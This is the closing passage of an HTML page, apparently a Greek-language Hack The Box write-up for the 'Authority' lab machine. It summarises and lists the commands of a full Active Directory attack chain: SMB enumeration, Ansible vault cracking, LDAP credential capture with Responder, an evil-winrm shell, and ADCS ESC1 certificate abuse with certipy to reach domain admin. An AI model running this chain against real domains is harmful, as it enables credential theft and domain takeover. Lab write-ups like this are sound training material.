+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">crackmapexec &#8212; domain admin</span></div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~/HTB/authority</span><span class="ps">]</span>
+<span class="pd">&#9492;$ </span><span class="pc">crackmapexec winrm 10.10.11.222 -u 'sp1r4admin' -p 'Passw0rd123!' -x 'type C:\Users\Administrator\Desktop\root.txt'</span>
+<span class="pg">WINRM  10.10.11.222  [+] authority.htb\sp1r4admin:Passw0rd123! (Pwn3d!)
+HTB{...}</span></div>
+  </div>
+
+  <div class="alert alert-success">&#128681; Root flag πιάστηκε. Το μηχάνημα pwned.</div>
+
+  <!-- SUMMARY -->
+  <h2>Περίληψη</h2>
+  <table class="st">
+    <tr><th>Σταδιο</th><th>Τεχνικη</th><th>Εργαλειο</th></tr>
+    <tr><td>Recon</td><td>Πλήρες port scan &#8594; θύρες DC + θύρα 8443 (PWM)</td><td>nmap</td></tr>
+    <tr><td>Enum</td><td>SMB anonymous &#8594; share Development &#8594; playbooks Ansible</td><td>smbclient</td></tr>
+    <tr><td>Cred decrypt</td><td>ansible2john &#8594; john crack &#8594; ansible-vault decrypt</td><td>john, ansible</td></tr>
+    <tr><td>Foothold</td><td>PWM config LDAP redirect &#8594; Responder &#8594; svc_ldap plaintext</td><td>responder, evil-winrm</td></tr>
+    <tr><td>PrivEsc</td><td>addcomputer &#8594; ADCS ESC1 &#8594; certipy req/auth &#8594; Domain Admin</td><td>impacket, certipy</td></tr>
+  </table>
+
+  <h2>Βασικές εντολές</h2>
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">quick reference</span></div>
+    <div class="term-body"><span class="pco"># Καταμετρηση SMB</span>
+<span class="pc">smbclient -N //10.10.11.222/Development</span>
+
+<span class="pco"># Σπασε το Ansible Vault</span>
+<span class="pc">ansible2john vault_file.txt &gt; vault.hash &amp;&amp; john vault.hash --wordlist=rockyou.txt</span>
+<span class="pc">cat vault_file.txt | ansible-vault decrypt</span>
+
+<span class="pco"># Πιασε credentials LDAP</span>
+<span class="pc">responder -I tun0 -wA</span>
+
+<span class="pco"># Shell WinRM</span>
+<span class="pc">evil-winrm -i 10.10.11.222 -u svc_ldap -p 'lDaP_1n_th3_cle4r!'</span>
+
+<span class="pco"># Πρόσθεσε λογαριασμό machine</span>
+<span class="pc">impacket-addcomputer authority.htb/svc_ldap:'lDaP_1n_th3_cle4r!' -dc-ip 10.10.11.222 -computer-name 'SP1R4$' -computer-pass 'SP1R4pass1!'</span>
+
+<span class="pco"># Exploit ADCS ESC1</span>
+<span class="pc">certipy find -u 'SP1R4$@authority.htb' -p 'SP1R4pass1!' -dc-ip 10.10.11.222 -vulnerable</span>
+<span class="pc">certipy req -username 'SP1R4$@authority.htb' -password 'SP1R4pass1!' -ca 'AUTHORITY-CA' -template 'CorpVPN' -upn 'administrator@authority.htb' -dc-ip 10.10.11.222</span>
+<span class="pc">certipy auth -pfx administrator_authority.pfx -dc-ip 10.10.11.222 -ldap-shell</span></div>
+  </div>
+
+</div>
+
+<div class="htb-cta">
+  <a href="https://app.hackthebox.com/users/332355" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><polygon points="12 2 22 8.5 22 15.5 12 22 2 15.5 2 8.5"/><line x1="12" y1="22" x2="12" y2="15.5"/><polyline points="22 8.5 12 15.5 2 8.5"/></svg>
+    <span><span class="l-t">HackTheBox</span><span class="l-s">My HTB profile &amp; more boxes</span></span>
+    <span class="l-x">↗</span>
+  </a>
+  <a href="https://github.com/s-markakis" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"/></svg>
+    <span><span class="l-t">GitHub</span><span class="l-s">Open-source security &amp; automation tools</span></span>
+    <span class="l-x">↗</span>
+  </a>
+</div>
+<footer>
+  <span>&#169; 2026 <a href="https://s-markakis.github.io/index.html">S. Markakis</a></span>
+  <span><a href="https://s-markakis.github.io/blog.html">&#8592; Ολα τα writeups</a></span>
+</footer>
+
+<script src="../js/i18n.js" defer></script>
+<script src="../js/nav.js" defer></script>
+<script src="../js/writeup-sidebar.js" defer></script>
+<script src="../js/writeup-enhance.js" defer></script>
+</body>
+</html>
